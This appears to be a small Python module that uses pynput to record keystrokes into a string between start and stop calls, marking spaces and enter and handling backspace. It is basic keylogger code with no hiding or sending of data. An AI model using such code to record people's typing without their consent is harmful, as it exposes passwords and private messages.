from pynput.keyboard import Listener, Key
import time
log =""
listener = None

def on_press(key):
    global log

    if hasattr(key,"char") and key.char is not None:
        log+=key.char
    else:
        if key == Key.space:
            log += " "  
        elif key == Key.enter:
            log += " -[enter]- "  
        elif key == Key.backspace:
            log = log[:-1]                


def start_logging():
    global listener
    global log
    log =""
    print("started")
    if listener is None or not listener.running:
        listener =  Listener(on_press=on_press)
        listener.start()

def stop_logging():
    global listener
    print("stopped")
    if listener is not None and listener.running:
        listener.stop()
        listener = None
    return log